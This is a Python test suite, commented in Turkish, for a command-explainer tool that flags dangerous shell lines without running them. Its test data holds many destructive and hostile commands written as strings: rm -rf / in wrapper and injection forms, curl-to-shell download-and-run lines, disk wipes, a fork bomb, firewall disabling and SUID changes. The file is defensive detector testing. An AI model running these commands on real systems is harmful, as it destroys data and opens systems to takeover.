#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Komut Açıklayıcı denetim bulgularının (docs/denetim/karsilama-acikla.md, A-01…A-10) kalıcı testleri.

Tehlikeli örnek satırların HİÇBİRİ çalıştırılmaz: yalnızca açıklayıcıya METİN olarak verilir.
Gerçek bash testinde yalnızca zararsız `touch <kanarya>` komutları kullanılır ve kanaryanın OLUŞMADIĞI denetlenir.

Calistirma:  python3 tests/test_acikla_denetim.py
"""
import os
import re
import shutil
import subprocess
import sys
import tempfile
import time
import unittest

sys.dont_write_bytecode = True

KOK = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
INC = os.path.join(KOK, "config", "includes.chroot")
ACIKLA = os.path.join(INC, "opt", "carotos", "acikla")
CLI = os.path.join(INC, "usr", "local", "bin", "carotos-acikla")
BASH_DOSYASI = os.path.join(INC, "usr", "share", "carotos", "acikla.bash")
sys.path.insert(0, os.path.join(INC, "opt", "carotos", "ortak"))
sys.path.insert(0, ACIKLA)

import acikla_motor as M  # noqa: E402
import veri_tehlike  # noqa: E402


def idler(satir):
    return {t["id"] for t in M.ayristir(satir)["tehlikeler"]}


def komutlar(satir):
    return [p["komut"] for p in M.ayristir(satir)["parcalar"]]


class _Ortak(unittest.TestCase):
    def tehlikeli(self, vakalar):
        for satir, beklenen in vakalar.items():
            with self.subTest(satir=satir):
                self.assertIn(beklenen, idler(satir), M.acikla(satir, "en"))

    def zararsiz(self, satirlar):
        for satir in satirlar:
            with self.subTest(satir=satir):
                self.assertEqual(idler(satir), set(), M.acikla(satir, "en"))


class A01SozcukOrtasindakiDiyez(_Ortak):
    def test_rapordaki_satirlar(self):
        self.tehlikeli({
            "echo a#b; rm -rf /": "rm_tehlikeli",
            "ls x#y && rm -rf ~": "rm_tehlikeli",
            "echo $#; rm -rf /": "rm_tehlikeli",
            "echo ok # yorum\nrm -rf /": "rm_tehlikeli",
            "curl http://x/p#frag; rm -rf /": "rm_tehlikeli",
        })
        self.assertEqual(komutlar("echo a#b; rm -rf /"), ["echo", "rm"])

    def test_sozcuk_basindaki_diyez_yorumdur(self):
        s = M.ayristir("echo a #rm -rf /")
        self.assertEqual(komutlar("echo a #rm -rf /"), ["echo"])
        self.assertEqual(s["tehlikeler"], [])
        self.assertTrue(s["yorum"])
        self.assertIn("comment", M.acikla("echo a #rm -rf /", "en"))

    def test_zararsizlar(self):
        self.zararsiz(["echo \"a # b\"", "grep '#' dosya", "echo a#b", "echo $#"])
        self.assertEqual(M.ayristir("echo \"a # b\"")["parcalar"][0]["konumsal"], ["a # b"])
        self.assertEqual(M.ayristir("grep '#' dosya")["parcalar"][0]["konumsal"], ["#", "dosya"])
        self.assertFalse(M.ayristir("echo \"a # b\"")["yorum"])


class A02YeniSatirAyiricidir(_Ortak):
    def test_yeni_satir_ve_cr(self):
        for satir in ("ls\nrm -rf /", "echo temiz\rrm -rf /", "echo temiz\r\nrm -rf /"):
            with self.subTest(satir=repr(satir)):
                self.assertEqual(komutlar(satir)[-1], "rm")
                self.assertIn("rm_tehlikeli", idler(satir))

    def test_cok_satir_uyarisi(self):
        metin = M.acikla("ls\nrm -rf /", "en")
        self.assertIn("2 separate lines", metin)
        self.assertIn("new line", metin)
        self.assertNotIn("separate lines", M.acikla("ls; pwd", "en"))

    def test_tirnak_icindeki_yeni_satir_ayirmaz(self):
        self.assertEqual(komutlar("echo 'a\nrm -rf /'"), ["echo"])
        self.assertEqual(idler("echo 'a\nrm -rf /'"), set())

    def test_ters_bolu_satir_devami(self):
        self.assertEqual(komutlar("ls \\\n-l"), ["ls"])

    def test_cr_denetim_karakteri_olarak_da_uyarilir(self):
        self.assertTrue(M.ayristir("echo temiz\rrm -rf /")["supheli_karakter"])


class A03BilesikVeSarmalayicilar(_Ortak):
    RAPOR = [
        "for i in 1; do rm -rf /; done", "if true; then rm -rf /; fi", "while :; do rm -rf /; done",
        "until false; do rm -rf /; done", "! rm -rf /", "{ rm -rf /; }", "true && { rm -rf /; }",
        "case x in x) rm -rf / ;; esac", "if false; then :; else rm -rf /; fi", "(rm -rf /)",
        "bash -c 'rm -rf /'", "sudo sh -c 'rm -rf /'", "su -c 'rm -rf /'", "su - root -c 'rm -rf /'",
        "ssh h 'rm -rf /'", "watch rm -rf /", "eval 'rm -rf /'", "sudo --user root rm -rf /",
        "sudo --user=root rm -rf /", "sudo -E rm -rf /", "sudo -u root -- rm -rf /", "env -u FOO rm -rf /",
        "env -i PATH=/bin rm -rf /", "timeout -s KILL 10 rm -rf /", "nice -n 5 rm -rf /", "nohup rm -rf / &",
        "time rm -rf /", "xargs -0 rm -rf /", "dash -c 'rm -rf /'", "zsh -c 'rm -rf /'", "bash -ec 'rm -rf /'",
        "echo $(rm -rf /)", "echo `rm -rf /`", "cat <(rm -rf /)", "a=(1 2 $(rm -rf /))", "X=$(rm -rf /) ls",
        "bash <<EOF\nrm -rf /\nEOF", "cat <<EOF\n$(rm -rf /)\nEOF", "f() { rm -rf /; }", "function f { rm -rf /; }",
        "sudo bash -c \"sh -c 'rm -rf /'\"", "env -S 'rm -rf /'", "flock /tmp/k -c 'rm -rf /'",
    ]

    def test_rapordaki_satirlarin_hepsi_uyarir(self):
        self.tehlikeli({s: "rm_tehlikeli" for s in self.RAPOR})

    def test_find_exec(self):
        self.tehlikeli({"find / -exec rm -rf {} \\;": "find_sil"})
        s = M.ayristir("find . -name x -exec rm -rf / \\;")
        self.assertIn("rm", [p["komut"] for p in s["parcalar"]])
        self.assertIn("rm_tehlikeli", {t["id"] for t in s["tehlikeler"]})

    def test_ic_komut_ayri_parca_ve_etiket(self):
        s = M.ayristir("bash -c 'rm -rf /'")
        self.assertEqual([p["komut"] for p in s["parcalar"]], ["sh", "rm"])
        self.assertEqual(s["parcalar"][1]["bagla"], "ic")
        self.assertIn("Part 1 runs this command", M.metin_olustur(s, "en"))
        s = M.ayristir("echo $(whoami)")
        self.assertEqual(s["parcalar"][1]["bagla"], "ikame")
        self.assertIn("runs FIRST", M.metin_olustur(s, "en"))
        self.assertIn("REMOTE", M.acikla("ssh h 'ls'", "en"))

    def test_anahtar_sozcukler_program_sanilmaz(self):
        for satir in ("for i in 1; do ls; done", "if true; then ls; fi", "{ ls; }", "! ls"):
            with self.subTest(satir=satir):
                adlar = komutlar(satir)
                for yanlis in ("do", "then", "{", "!", "done", "fi", "}"):
                    self.assertNotIn(yanlis, adlar)
                self.assertIn("ls", adlar)

    def test_onek_secenekleri(self):
        p = M.ayristir("sudo -u root ufw status verbose")["parcalar"][0]
        self.assertEqual((p["komut"], p["sudo"]), ("ufw", True))
        self.assertEqual(M.ayristir("timeout -s KILL 10 ls")["parcalar"][0]["komut"], "ls")
        self.assertEqual(M.ayristir("sudo --user root ls")["parcalar"][0]["komut"], "ls")
        self.assertEqual(M.ayristir("env -u FOO ls")["parcalar"][0]["komut"], "ls")
        self.assertEqual(M.onek_ayikla(["sudo", "-u", "root", "ls", "-l"]), ("ls", ["-l"], True, []))

    def test_sudo_kabuk(self):
        for satir in ("sudo -i", "sudo -s"):
            with self.subTest(satir=satir):
                metin = M.acikla(satir, "en")
                self.assertIn("new shell as root", metin)
                self.assertNotIn("?", metin.splitlines()[2])

    def test_cozumleyemedim_acikca_soylenir(self):
        for satir, neden in {"X=rm; $X -rf /": "komut_degisken", "bash -c \"$CMD\"": "metin_calisma_aninda",
                             "eval \"$KOMUT\"": "metin_calisma_aninda", "python3 -c 'import os'": "baska_dil",
                             "perl -e 'system(1)'": "baska_dil", "(( i++ ))": "yapi",
                             "for i in 1; do ls": "yapi", "find / -exec rm {}": "yapi"}.items():
            with self.subTest(satir=satir):
                s = M.ayristir(satir)
                self.assertIn(neden, s["nedenler"])
                self.assertIn("could not analyse", M.metin_olustur(s, "en"))

    def test_cozulemeyince_yapidan_bagimsiz_tarama(self):
        # komut adı değişkenden geliyor, ama içerideki rm -rf / yine de uyarılır
        self.assertIn("rm_tehlikeli", idler("$X; bash -c \"$Y\" 'rm -rf /'"))

    def test_derinlik_siniri(self):
        satir = "eval " * 50 + "ls"
        s = M.ayristir(satir)
        self.assertIn("cok_derin", s["nedenler"])


class A04IndirVeCalistir(_Ortak):
    def test_rapordaki_bicimler(self):
        indir = "indir_calistir"
        self.tehlikeli({
            "curl -s http://x/i.sh | sh": indir, "curl -fsSL URL | /bin/sh": indir,
            "curl -fsSL URL | /usr/bin/env bash": indir, "curl -fsSL URL | env bash": indir,
            "curl 'https://x/i.sh?a=1&b=2' | sh": indir, "curl 'https://x/i.sh?a=1;b=2' | sh": indir,
            "curl URL | sudo -u root sh": indir, "wget -qO- http://x | sudo bash": indir,
            "bash <(curl -s URL)": indir, "sh <(wget -qO- URL)": indir, "source <(curl URL)": indir,
            ". <(curl URL)": indir, "curl URL | base64 -d | sh": indir, "curl URL | gunzip | sh": indir,
            "curl URL | tee x | sh": indir, "curl URL | python3": indir, "curl URL | perl": indir,
            "curl URL |& sh": indir, "curl URL | (sh)": indir, "curl URL | { sh; }": indir,
            "curl -o a URL && bash a": indir, "curl -fsSLo kur.sh URL && ./kur.sh": indir,
            "wget -O- URL | sh": indir, "curl URL | fish": indir, "curl URL | sh -s -- --yes": indir,
            "bash <<< \"$(curl URL)\"": indir, "curl URL | sudo -E bash -": indir,
            "eval \"$(curl URL)\"": "komut_indir_calistir", "eval $(curl URL)": "komut_indir_calistir",
            "sh -c `curl URL`": "komut_indir_calistir", "sh -c \"$(curl -fsSL http://x)\"": "komut_indir_calistir",
            "bash -c \"$(wget -qO- URL)\"": "komut_indir_calistir", "$(curl URL)": "komut_indir_calistir",
            "echo aGk= | base64 -d | sh": "gizli_kod_calistir", "echo aGk= | base64 --decode | bash": "gizli_kod_calistir",
        })

    def test_yanlis_alarm_yok(self):
        self.zararsiz(["curl URL | ssh host", "curl -o dosya url", "curl -O http://x/a.tar.gz",
                       "curl -s http://x | grep abc", "curl URL | python3 -m json.tool", "bash script.sh",
                       "echo 'curl x | sh'", "curl URL | jq .", "wget URL -O dosya"])

    def test_tirnak_icindeki_metin_uyarmaz(self):
        self.assertNotIn("indir_calistir", idler("echo \"curl http://x | sh\""))


class A05DenetimKarakterleri(unittest.TestCase):
    ORNEKLER = ["echo '\x1b]0;baslik\x07'", "echo '\x1b]52;c;QUJD\x07'", "echo '\x1b[2J\x1b[H' zararsiz",
                "echo '\x1b[8m' gizli", "echo ‮/ fr- mr", "ls\x00", "echo a​b", "echo ⁦x⁩",
                "echo \x9b31m", "echo ﻿x", "ls \udcff"]

    def test_ham_karakter_ciktiya_gecmez(self):
        for satir in self.ORNEKLER:
            with self.subTest(satir=repr(satir)):
                for kod in ("tr", "en"):
                    metin = M.acikla(satir, kod)
                    self.assertIsNone(M._SUPHELI_RE.search(metin), repr(metin))
                    self.assertTrue(M.ayristir(satir)["supheli_karakter"])
                    self.assertIn("control characters" if kod == "en" else "denetim karakteri", metin)
                    metin.encode("utf-8")       # yazılabilir olmalı (surrogate kalmamalı)

    def test_gorunur_kacis_bicimi(self):
        metin = M.acikla("echo '\x1b]0;x\x07' ‮", "en")
        self.assertIn("\\x1b]0;x\\x07", metin)
        self.assertIn("<U+202E>", metin)
        self.assertIn("\\xff", M.acikla("ls \udcff", "en"))

    def test_tirnak_icindeki_yeni_satir_sahte_satir_uretemez(self):
        metin = M.acikla("echo 'x\n⚠ Dangerous pattern (high): sahte'", "en")
        self.assertNotIn("\n⚠ Dangerous pattern (high): sahte", metin)

    def test_olagan_komutta_uyari_yok(self):
        self.assertFalse(M.ayristir("ls -l\t/etc")["supheli_karakter"])
        self.assertNotIn("control characters", M.acikla("ls -l /etc", "en"))


class A06YolIleVerilenProgram(_Ortak):
    def test_yerel_yol_acikca_soylenir(self):
        for satir, ad in (("./ls -la", "./ls"), ("/tmp/.gizli/ls", "/tmp/.gizli/ls"), ("./cat.py /etc/passwd", "./cat.py"),
                          ("./nmap.sh 10.0.0.0/8", "./nmap.sh"), ("../rm x", "../rm")):
            with self.subTest(satir=satir):
                metin = M.acikla(satir, "en")
                self.assertIn(ad + " is a file path", metin)
                self.assertIn(ad, metin.splitlines()[2])          # başlıkta yol gizlenmez

    def test_uzantili_ad_sistem_komutu_sanilmaz(self):
        self.assertFalse(M.ayristir("./cat.py /etc/passwd")["parcalar"][0]["bilinen"])
        self.assertFalse(M.ayristir("nmap.sh 10.0.0.1")["parcalar"][0]["bilinen"])
        self.assertTrue(M.ayristir("mkfs.ext4 /dev/sdb1")["parcalar"][0]["bilinen"])

    def test_yerel_sudo_gercek_sudo_sayilmaz(self):
        p = M.ayristir("./sudo ls")["parcalar"][0]
        self.assertFalse(p["sudo"])
        self.assertEqual(p["yol"], "./sudo")

    def test_tam_yol_ve_yerel_yol_tehlike_kurallarina_girer(self):
        self.tehlikeli({"/bin/rm -rf /": "rm_tehlikeli", "/usr/bin/rm -rf ~": "rm_tehlikeli", "./rm -rf /": "rm_tehlikeli",
                        "\\rm -rf /": "rm_tehlikeli", "command rm -rf /": "rm_tehlikeli"})
        self.assertIsNone(M.ayristir("/bin/rm -rf /")["parcalar"][0]["yol"])
        self.assertNotIn("file path", M.acikla("/usr/bin/ls", "en"))


class A07TehlikeKurallari(_Ortak):
    def test_rm(self):
        self.tehlikeli({s: "rm_tehlikeli" for s in (
            "rm -rf /usr/", "rm -rf /var/", "rm -rf //", "rm -rf /./", "rm -rf /root", "rm -rf /opt", "rm -rf /dev",
            "rm -rf ~/.*", "rm -rf $HOME/.*", "rm -rf .", "rm -rf ..", "rm -rf ./*", "rm -rf ${HOME}", "rm -rf $HOME/..",
            "rm -rf /{usr,etc}", "rm -rf /usr/bin", "rm -rf /home/ali", "rm -rf -- /", "rm -rf \"$HOME\"")})

    def test_find(self):
        self.tehlikeli({s: "find_sil" for s in ("find / -delete", "find ~ -type f -delete", "find / -exec rm -rf {} \\;",
                                                "find . -exec shred {} +")})

    def test_aygita_yazma(self):
        self.tehlikeli({
            "dd if=a of=/dev/disk/by-id/usb-X": "dd_diske", "dd if=a of=/dev/mapper/kok": "dd_diske",
            "dd if=a of=/dev/md0": "dd_diske", "dd if=a of=/dev/dm-0": "dd_diske", "dd if=a of=/dev/loop0": "dd_diske",
            "dd if=a of=/dev/mem": "dd_diske", "dd if=a of=$DISK": "dd_diske", "dd if=a of=/dev/sda": "dd_diske",
            "echo x | tee /dev/sda": "diske_yaz", "cat /dev/zero > /dev/sda": "diske_yaz", "echo x > /dev/sda": "diske_yaz",
            "echo x >| /dev/sda": "diske_yaz", "cp a.iso /dev/sdb": "diske_yaz",
            "echo x > /etc/passwd": "yonlendirme_tehlikeli", "echo x > ~/.bashrc": "yonlendirme_tehlikeli",
            "bilinmeyenkomut > /etc/passwd": "yonlendirme_tehlikeli",
            "wipefs -a /dev/sdb": "disk_sil", "shred /dev/sda": "disk_sil", "sgdisk --zap-all /dev/sda": "disk_sil",
            "fdisk /dev/sda": "bolum_degistir", "parted /dev/sda rm 1": "bolum_degistir",
            "mkfs.ext4 /dev/sdb1": "mkfs",
        })

    def test_chmod_ve_digerleri(self):
        self.tehlikeli({
            "chmod -R 0777 /": "chmod_genis", "chmod -R a+rwx /": "chmod_genis", "chmod -R ugo+rwx /": "chmod_genis",
            "chmod -R o+rwx /": "chmod_genis", "chmod 777 /etc/shadow": "chmod_genis", "chmod 666 /etc/passwd": "chmod_genis",
            "chmod -R 777 /": "chmod_genis",
            "chmod u+s /bin/bash": "chmod_suid", "chmod 4755 /bin/sh": "chmod_suid", "chmod +s x": "chmod_suid",
            ":(){ :|:& };:": "catal_bombasi", "bomba() { bomba | bomba & }; bomba": "catal_bombasi",
            "iptables -F": "guvenlik_kapat", "iptables -P INPUT ACCEPT": "guvenlik_kapat",
            "nft flush ruleset": "guvenlik_kapat", "setenforce 0": "guvenlik_kapat", "eval ls": "eval_calistir",
            "chown -R a:a /etc": "chown_kok",
        })

    def test_veri_tabaninda(self):
        for ad in ("shred", "wipefs", "fdisk", "parted", "sgdisk", "iptables", "nft", "setenforce", "eval", "su", "watch"):
            with self.subTest(ad=ad):
                self.assertTrue(M.ayristir(ad + " x")["parcalar"][0]["bilinen"])

    def test_zararsizlar(self):
        self.zararsiz(["rm -rf ./build", "rm -rf build/", "rm -r ./gecici", "rm dosya.txt", "rm -rf ~/Downloads/eski",
                       "rm -rf /tmp/derleme", "find . -name '*.pyc' -delete", "find ~ -name '*.tmp' -delete",
                       "dd if=a.iso of=/tmp/b.img", "dd if=/dev/zero of=/dev/null", "ls > /dev/null 2>&1",
                       "echo hi >&2", "echo x >> ~/.bashrc", "echo x | sudo tee -a /etc/hosts", "chmod 644 a",
                       "chmod -R 755 ./site", "chmod g+s paylasim", "chmod +x betik.sh", "fdisk -l", "parted /dev/sda print",
                       "wipefs /dev/sdb", "iptables -L", "setenforce 1", "cat <<< merhaba"])


class A08YonlendirmeGosterimi(unittest.TestCase):
    def test_fd_kopyalama(self):
        s = M.ayristir("ls > /dev/null 2>&1")
        p = s["parcalar"][0]
        self.assertEqual(p["konumsal"], [])                       # 2 argüman sanılmıyor
        self.assertEqual(p["yonlendirme"], [(">", "/dev/null"), ("2>&", "1")])
        metin = M.metin_olustur(s, "en")
        self.assertIn("2>&1: joins one output stream", metin)
        self.assertNotIn("1: writes the output", metin)
        self.assertIn(">&2: joins", M.acikla("echo hi >&2", "en"))

    def test_here_string_ve_here_document(self):
        self.assertIn("<<< merhaba: gives this text as input", M.acikla("cat <<< merhaba", "en"))
        self.assertIn("here-document", M.acikla("cat <<EOF\na\nEOF", "en"))

    def test_taninmayan_komutta_yonlendirme_gosterilir(self):
        self.assertIn("> /etc/passwd: writes the output", M.acikla("bilinmeyenkomut > /etc/passwd", "en"))

    def test_ikame_yazildigi_gibi_gosterilir(self):
        self.assertIn("echo $(id)", M.acikla("echo $(id)", "en"))


class A09UcGirdiler(unittest.TestCase):
    def test_uzun_ve_kalabalik_girdiler_hizli_ve_sinirli(self):
        vakalar = {"curl " * 100000: "cok_uzun", "ls;" * 50000: "cok_parca", "a" * 1000000: "cok_uzun",
                   "$(" * 20000 + "ls" + ")" * 20000: "cok_derin", "eval " * 5000 + "ls": "cok_derin"}
        for satir, neden in vakalar.items():
            with self.subTest(satir=satir[:20]):
                bas = time.monotonic()
                metin = M.acikla(satir, "en")
                self.assertLess(time.monotonic() - bas, 10)
                self.assertLess(len(metin), 2_000_000)
                self.assertIn(neden, M.ayristir(satir)["nedenler"])

    def test_cokmeyen_girdiler(self):
        for satir in ("(" * 100000 + "ls" + ")" * 100000, "'a' " * 100000, "|", ";", ">", "(", "ls \\", "$(" * 20000,
                      "echo `ls", "cat <<EOF\nabc", "case x in " * 2000, "{ " * 10000, "rm -", "kill -999", "--=", "-",
                      "$'\\x1b", "${", "$((", "a=(", "echo \"$(", "<(", "))))", "\udcff\udcfe", "\x00" * 100):
            with self.subTest(satir=satir[:20]):
                self.assertTrue(M.acikla(satir, "en"))

    def test_cli_gecersiz_utf8(self):
        if os.name != "posix":
            self.skipTest("POSIX argv baytları gerekir")
        ortam = dict(os.environ, PYTHONDONTWRITEBYTECODE="1", LC_ALL="C.UTF-8")
        ortam.pop("PYTHONIOENCODING", None)
        s = subprocess.run([sys.executable, CLI, "--dil", "en", "--satir", b"ls \xff\xfe"], capture_output=True, timeout=60, env=ortam)
        self.assertEqual(s.returncode, 0, s.stderr)
        self.assertIn(b"\\xff", s.stdout)
        s = subprocess.run([sys.executable, CLI, "--dil", "en"], input=b"echo \xff\n", capture_output=True, timeout=60, env=ortam)
        self.assertEqual(s.returncode, 0, s.stderr)
        self.assertIn(b"Prints the given text", s.stdout)


class A10VeriVeArgv(unittest.TestCase):
    def calistir(self, *argv):
        s = subprocess.run([sys.executable, CLI, *argv], capture_output=True, text=True, encoding="utf-8", timeout=60,
                           env=dict(os.environ, PYTHONIOENCODING="utf-8", PYTHONDONTWRITEBYTECODE="1"))
        self.assertEqual(s.returncode, 0, s.stderr)
        return s.stdout

    def test_ss_p_root_gerektirmez(self):
        self.assertEqual(M.ayristir("ss -p")["parcalar"][0]["root"], "gerekebilir")
        self.assertEqual(M.ayristir("ss -tlnp")["parcalar"][0]["root"], "gerekebilir")

    def test_argv_tirnaklari_korunur(self):
        metin = self.calistir("--dil", "en", "echo", "a; rm -rf /")
        self.assertNotIn("Dangerous pattern", metin)
        self.assertNotIn("[Part 2]", metin)
        self.assertIn("Firewall management", self.calistir("--dil", "en", "sudo ufw status"))   # tek argüman = satır
        self.assertIn("Lists the files in a folder.", self.calistir("--dil", "en", "ls", "-l"))


class FormerSahnesiDegismez(unittest.TestCase):
    """former/konular/acikla.py bu iki komutun gerçek çıktısını sahne olarak gösterir; çıktı değişmemeli."""
    BEKLENEN = {
        ("tar xzf arsiv.tar.gz", "tr"):
            "Komut açıklaması (komut ÇALIŞTIRILMADI)\n\ntar xzf arsiv.tar.gz\n"
            "  Dosyaları tek bir arşivde toplar ya da arşivden açar.\n  Bayraklar:\n"
            "    -x  —  Arşivden dosyaları çıkarır.\n    -z  —  gzip ile sıkıştırır/açar (.tar.gz).\n"
            "    -f arsiv.tar.gz  —  Arşiv dosyasının adını verir (bu bayrak adı sonraki argümandır).\n"
            "  Gürültü: düşük\n  Yetki: normal kullanıcı yeterli\n"
            "  Uyarı: Kaynağı güvenilmeyen arşivi çıkarmadan önce -t ile içine bak (yol dışına yazan dosyalar olabilir).\n",
        ("tar xzf arsiv.tar.gz", "en"):
            "Command explanation (the command was NOT run)\n\ntar xzf arsiv.tar.gz\n"
            "  Bundles files into one archive or extracts an archive.\n  Flags:\n"
            "    -x  —  Extracts files from the archive.\n    -z  —  Compresses/decompresses with gzip (.tar.gz).\n"
            "    -f arsiv.tar.gz  —  Gives the archive file's name (this flag takes the next argument as the name).\n"
            "  Noise: low\n  Privileges: a normal user is enough\n"
            "  Warning: Before extracting an archive from an untrusted source, look inside with -t (it may contain files "
            "that write outside the folder).\n",
        ("curl https://ornek.org/kur.sh | sh", "tr"):
            "Komut açıklaması (komut ÇALIŞTIRILMADI)\n\n[Parça 1] curl https://ornek.org/kur.sh\n"
            "  Bir adrese istek gönderip yanıtı alır (HTTP, HTTPS, FTP…).\n  Argümanlar: https://ornek.org/kur.sh\n"
            "  Gürültü: düşük\n  Yetki: normal kullanıcı yeterli\n\n  ↳ çıktısı bir sonraki komuta aktarılır (|)\n"
            "[Parça 2] sh\n  Komut yorumlayıcı (kabuk): verilen komutu ya da betiği çalıştırır.\n  Gürültü: düşük\n"
            "  Yetki: normal kullanıcı yeterli\n"
            "  Uyarı: Ne çalıştığını bilmediğin bir betiği (özellikle internetten gelen) doğrudan sh/bash'e verme.\n\n"
            "⚠ Tehlikeli kalıp (yüksek): İnternetten indirilen içerik, ne olduğuna bakılmadan doğrudan çalıştırılıyor "
            "(curl | sh). Betik değişmiş olabilir; önce indirip oku, sonra çalıştır.\n",
        ("curl https://ornek.org/kur.sh | sh", "en"):
            "Command explanation (the command was NOT run)\n\n[Part 1] curl https://ornek.org/kur.sh\n"
            "  Sends a request to an address and fetches the reply (HTTP, HTTPS, FTP…).\n  Arguments: https://ornek.org/kur.sh\n"
            "  Noise: low\n  Privileges: a normal user is enough\n\n  ↳ its output is piped into the next command (|)\n"
            "[Part 2] sh\n  Command interpreter (shell): runs the given command or script.\n  Noise: low\n"
            "  Privileges: a normal user is enough\n"
            "  Warning: Don't feed a script you haven't read (especially one from the internet) straight to sh/bash.\n\n"
            "⚠ Dangerous pattern (high): Content downloaded from the internet is run directly without looking at it "
            "(curl | sh). The script may have been tampered with; download it, read it, then run it.\n",
    }

    def test_birebir(self):
        for (satir, kod), beklenen in self.BEKLENEN.items():
            with self.subTest(satir=satir, kod=kod):
                self.assertEqual(M.acikla(satir, kod), beklenen)


class KurallarVeEtiketler(unittest.TestCase):
    def test_kural_idleri_benzersiz_ve_iki_dilli(self):
        kurallar = veri_tehlike.SATIR_KURALLARI + veri_tehlike.PARCA_KURALLARI + veri_tehlike.YAPI_KURALLARI
        idler_ = [k["id"] for k in kurallar]
        self.assertEqual(len(idler_), len(set(idler_)))
        for k in kurallar:
            self.assertEqual(set(k["neden"]), {"tr", "en"}, k["id"])
            self.assertIn(k["siddet"], ("orta", "yuksek"))

    def test_yeni_etiketler_her_dilde_kullanilabilir(self):
        import dil
        for kod in dil.KODLAR:
            with self.subTest(kod=kod):
                metin = M.acikla("X=1; $X; bash -c 'ls' | sh\nls > /dev/null 2>&1 # n", kod)
                self.assertNotIn("{n}", metin)
                self.assertNotIn("{yol}", metin)


class CalistirmazSozu(unittest.TestCase):
    """Açıklayıcı hiçbir koşulda satırı çalıştırmaz: kaynakta eval/komut ikamesi yok; gerçek bash'te kanarya oluşmaz."""

    def test_bash_dosyasinda_eval_ve_tirnaksiz_genisleme_yok(self):
        with open(BASH_DOSYASI, encoding="utf-8") as f:
            kod = f.read()
        govde = "\n".join(s for s in kod.splitlines() if not s.lstrip().startswith("#"))
        for yasak in (r"\beval\b", r"\$\(", "`", r"[^\"]\$READLINE_LINE", r"\bsource\b", r"\bexec\b"):
            self.assertIsNone(re.search(yasak, govde), yasak)
        self.assertIn('carotos-acikla --satir "$READLINE_LINE"', govde)

    def test_cli_kaynaginda_calistirma_yok(self):
        with open(CLI, encoding="utf-8") as f:
            kod = f.read()
        kod = re.sub(r'"""[\s\S]*?"""', "", kod)
        for yasak in (r"\bsubprocess\b", r"\bos\.system\b", r"\bos\.popen\b", r"\bos\.exec", r"\beval\(", r"\bexec\(", r"\bPopen\b"):
            self.assertIsNone(re.search(yasak, kod), yasak)

    @unittest.skipUnless(shutil.which("bash") and os.name == "posix", "bash gerekir")
    def test_gercek_bash_alt_e_kanarya_olusmaz(self):
        kok = tempfile.mkdtemp(prefix="acikla-kanarya-")
        try:
            bin_ = os.path.join(kok, "bin")
            os.makedirs(bin_)
            sarmal = os.path.join(bin_, "carotos-acikla")
            with open(sarmal, "w", encoding="utf-8") as f:
                f.write('#!/bin/sh\nexec "%s" "%s" "$@"\n' % (sys.executable, CLI))
            os.chmod(sarmal, 0o755)
            k = os.path.join(kok, "k")
            satirlar = [
                f"touch {k}1", f"echo $(touch {k}2)", f"echo `touch {k}3`", f"ls; touch {k}4", f"ls | touch {k}5",
                f"ls && touch {k}6", f"echo > {k}7", f"ls\ntouch {k}8", f"echo a#b; touch {k}9",
                f"bash -c 'touch {k}10'", f"eval 'touch {k}11'", f"cat <(touch {k}12)", f"echo \"$(touch {k}13)\"",
                f"a=$(touch {k}14)", f"echo ${{X:-$(touch {k}15)}}", f"cat <<< $(touch {k}16)", f"echo temiz\rtouch {k}17",
                f"-h touch {k}18", f"sh -c \"$(touch {k}19)\"", f"x'; touch {k}20; '",
            ]
            for n, satir in enumerate(satirlar, 1):
                with self.subTest(n=n):
                    s = subprocess.run(
                        ["bash", "--norc", "--noprofile", "-i", "-c", 'source "$ACIKLA_BASH"; carotos_acikla_satir'],
                        capture_output=True, text=True, timeout=60, cwd=kok,
                        # ayri oturum: 'bash -i' terminalde is denetimine takilmasin
                        start_new_session=True, stdin=subprocess.DEVNULL,
                        env=dict(os.environ, PATH=bin_ + ":" + os.environ.get("PATH", "/usr/bin:/bin"),
                                 ACIKLA_BASH=BASH_DOSYASI, READLINE_LINE=satir, PYTHONDONTWRITEBYTECODE="1"))
                    self.assertTrue("NOT run" in s.stdout or "ÇALIŞTIRILMADI" in s.stdout, s.stdout + s.stderr)
            kalan = [ad for ad in os.listdir(kok) if ad.startswith("k")]
            self.assertEqual(kalan, [], "açıklayıcı komut çalıştırdı!")
        finally:
            shutil.rmtree(kok, ignore_errors=True)

    def test_motor_kanarya(self):
        kok = tempfile.mkdtemp(prefix="acikla-motor-")
        try:
            k = os.path.join(kok, "m")
            for satir in (f"touch {k}1", f"echo $(touch {k}2)", f"bash -c 'touch {k}3'", f"eval 'touch {k}4'",
                          f"cat <(touch {k}5)", f"bash <<EOF\ntouch {k}6\nEOF", f"find . -exec touch {k}7 \\;"):
                M.acikla(satir, "en")
            self.assertEqual(os.listdir(kok), [])
        finally:
            shutil.rmtree(kok, ignore_errors=True)


if __name__ == "__main__":
    unittest.main()
